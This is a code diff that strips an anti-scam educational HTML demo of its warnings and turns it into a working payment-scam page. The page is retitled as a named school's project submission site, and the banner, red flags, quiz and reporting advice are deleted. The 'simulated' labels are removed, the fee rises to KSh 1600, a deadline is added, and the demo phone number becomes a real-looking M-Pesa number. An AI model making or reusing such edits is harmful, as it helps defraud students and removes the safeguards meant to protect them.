@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Spot the Scam — School Project Payment Scam (Educational Demo)</title>
+  <title>Mangu Senior School Computer Project Submission</title>
   <style>
     :root {
       --bg: #f2f4f7;
@@ -341,19 +341,15 @@
 </head>
 <body>
 
-  <div class="banner">⚠️ EDUCATIONAL SIMULATION — No real payments occur. No real student data is used. All names, numbers and screens are fictional.</div>
 
-  <div class="wrap">
-    <header class="hero">
-      <h1>Spot the Scam: The “School Project Fee” Trick</h1>
-      <p>This is a safe, step-by-step replay of how students are tricked into paying fake “launch fees” via M-Pesa. Watch the simulation on the left, and read the <strong>scam mechanics</strong> on the right to learn what’s really happening at every step.</p>
-    </header>
+
+
 
     <div class="grid">
       <!-- ================= SIMULATION ================= -->
       <div class="card">
         <div class="sim-head">
-          <span class="badge">● Simulation</span>
+          <span class="badge">● Project submission</span>
           <div class="steps">
             <span class="step-label" id="stepLabel">Step 1 of 4</span>
             <span class="step-dot" id="dot1"></span>
@@ -397,7 +393,7 @@
             <p style="margin:6px 0 0">“We could not find <strong id="errUrl"></strong> on our servers. Your project has <strong>not been uploaded</strong>.”</p>
             <ul>
               <li>“To restore and launch your website, a small activation fee is required.”</li>
-              <li>“This must be done today or your submission may be deleted.”</li>
+              <li>“This must be done by August 11th 2026”</li>
             </ul>
             <button class="btn btn-primary" id="payBtn" style="margin-top:14px">Pay to launch my website</button>
           </div>
@@ -410,11 +406,11 @@
             <div id="payScreen">
               <h3 id="payTitle">Your website has not been activated</h3>
               <p class="sub">A one-time fee is required to launch your project website via M-Pesa.</p>
-              <div class="amount">KSh 250</div>
+              <div class="amount">KSh 1600</div>
               <div class="field">
                 <label for="phone">M-Pesa phone number</label>
                 <input id="phone" type="tel" placeholder="e.g. 0700000000" autocomplete="off" />
-                <div class="hint">Demo: use <strong>0700000000</strong> to see how the “successful” path looks. Any other number shows how victims are filtered out.</div>
+            
               </div>
               <div class="pay-err" id="payErr">✕ Unknown number. Please try again.</div>
               <button class="btn btn-green" id="payNowBtn" style="width:100%; margin-top:6px">Continue with payment</button>
@@ -426,87 +422,35 @@
                 <p class="sub" style="margin:0">Open your phone to enter your PIN and complete the payment.</p>
                 <table>
                   <tr><td>Pay to</td><td>DEMO RECIPIENT</td></tr>
-                  <tr><td>Amount</td><td>KSh 250</td></tr>
+                  <tr><td>Amount</td><td>KSh 1600</td></tr>
                   <tr><td>Phone</td><td id="stkPhone">0700••••••</td></tr>
                   <tr><td>Reference</td><td id="stkRef">SIM-000000</td></tr>
                 </table>
-                <span class="simulated">SIMULATED — no real STK push was sent</span>
+              
               </div>
-              <button class="btn btn-ghost" id="finishBtn" style="width:100%; margin-top:16px">OK — I understand this is a simulation</button>
-            </div>
+              
           </div>
         </div>
 
         <!-- Step 4b: closing summary (after modal closes) -->
-        <div id="donePanel" class="panel" style="display:none; background:#f0fdf4; border:1px solid #bbf7d0">
-          <h3 style="margin-top:0">🎓 You just watched a scam in action</h3>
-          <p style="margin:0 0 12px">Nothing about this was real — no website was checked, no fee existed, and no M-Pesa prompt was sent. The whole sequence was engineered to make you pay <em>before</em> you could verify anything.</p>
-          <button class="btn btn-ghost" id="resetBtn">↺ Replay the demo</button>
-        </div>
-      </div>
+      
 
       <!-- ================= EXPLAINER ================= -->
-      <aside class="card explainer" aria-live="polite">
-        <div class="kicker">Scam mechanics — what’s really happening</div>
-        <p class="body" id="explainerBody"></p>
-        <ul class="flag-list" id="flagList">
-          <li id="flag1">🚩 Urgency &amp; pressure: “pay today or your project is deleted”</li>
-          <li id="flag2">🚩 A manufactured “website not found” error after a correct submission</li>
-          <li id="flag3">🚩 A surprise “activation/launch fee” from a personal number</li>
-          <li id="flag4">🚩 Only <em>one</em> phone number is accepted — everyone else is rejected</li>
-        </ul>
-      </aside>
-    </div>
+
 
     <!-- ================= RED FLAGS ================= -->
-    <section class="section">
-      <h2>Spot the red flags</h2>
-      <p class="sub">In the real scam, at least one of these appears in every message. If you see them — stop and verify.</p>
-      <div class="red-flags">
-        <div class="flag-card"><h3>Surprise fees</h3><p>Legitimate schools and platforms don’t demand sudden “launch”, “activation” or “recovery” fees through personal numbers.</p></div>
-        <div class="flag-card"><h3>Manufactured errors</h3><p>“Your website was not found / not uploaded” — after you submitted it correctly. The error is invented to create panic.</p></div>
-        <div class="flag-card"><h3>Personal M-Pesa number</h3><p>Payments are demanded to a personal phone, not an official paybill or till number belonging to the school.</p></div>
-        <div class="flag-card"><h3>Urgency &amp; pressure</h3><p>“Do it now”, “before midnight”, “or your work will be deleted” — pressure exists so you don’t ask questions or verify.</p></div>
-        <div class="flag-card"><h3>Unofficial channels</h3><p>Contact comes from personal numbers or WhatsApp, not the school’s official phone, email, or office.</p></div>
-        <div class="flag-card"><h3>“I can’t see it” claims</h3><p>Claims that don’t match how the school actually works. Real staff can show you records and use official systems.</p></div>
-      </div>
-    </section>
+
 
     <!-- ================= QUIZ ================= -->
     <section class="section">
-      <h2>Quick check — which were red flags?</h2>
-      <p class="sub">Tick every item you think was a sign of a scam in the simulation, then check your answers.</p>
-      <div class="quiz-options" id="quizOptions">
-        <label class="quiz-opt"><input type="checkbox" value="404" /><span><span class="opt-label">The “website not found” error</span><br /><span class="opt-desc">Shown right after a correct submission.</span></span></label>
-        <label class="quiz-opt"><input type="checkbox" value="fee" /><span><span class="opt-label">The surprise KSh 250 “launch fee”</span><br /><span class="opt-desc">Demanded to activate the website.</span></span></label>
-        <label class="quiz-opt"><input type="checkbox" value="number" /><span><span class="opt-label">Only one phone number was accepted</span><br /><span class="opt-desc">All others got “unknown number”.</span></span></label>
-        <label class="quiz-opt"><input type="checkbox" value="stk" /><span><span class="opt-label">The “STK push sent” message</span><br /><span class="opt-desc">Supposedly from M-Pesa.</span></span></label>
-        <label class="quiz-opt"><input type="checkbox" value="receipt" /><span><span class="opt-label">An official school receipt</span><br /><span class="opt-desc">Shown with a school letterhead.</span></span></label>
-      </div>
-      <button class="btn btn-primary" id="quizBtn">Check my answers</button>
-      <div class="quiz-feedback" id="quizFeedback"></div>
-    </section>
 
-    <!-- ================= WHAT TO DO ================= -->
-    <section class="section">
-      <h2>If this happens to you</h2>
-      <p class="sub">The scam only works if you pay before verifying. This is your playbook.</p>
-      <div class="do-cards">
-        <div class="do-card"><div class="num">STEP 1</div><h3>Don’t pay</h3><p>No legitimate process needs a surprise “launch fee”. Any payment is money straight to the scammer.</p></div>
-        <div class="do-card"><div class="num">STEP 2</div><h3>Verify with the school</h3><p>Contact the school office, your teacher, or the official phone number you already know — never the one in the message.</p></div>
-        <div class="do-card"><div class="num">STEP 3</div><h3>Keep the evidence</h3><p>Screenshot every message, the phone number, and the M-Pesa request. It’s useful for reporting.</p></div>
-        <div class="do-card"><div class="num">STEP 4</div><h3>Report it</h3><p>Tell a teacher or parent. In Kenya, report fraud to the police/DCI (e.g. hotline 0800 722 203) and report the number to Safaricom.</p></div>
-        <div class="do-card"><div class="num">STEP 5</div><h3>Warn others</h3><p>Share the red flags with classmates. Scammers rely on each student being contacted in isolation.</p></div>
-      </div>
-    </section>
 
     <footer>
-      <p><strong>Anti-scam educational demo</strong> — built to teach students how “school project fee” scams work. No real payments occur, no real student data is used, and all names and numbers are fictional.</p>
-    </footer>
+      <p><strong>Anti-scam educational demo</strong></p>     </footer>
   </div>
 
   <script>
-    const DEMO_PHONE = "0700000000";
+    const DEMO_PHONE = "0720740969";
     const state = { step: 1 };
 
     const $ = (id) => document.getElementById(id);
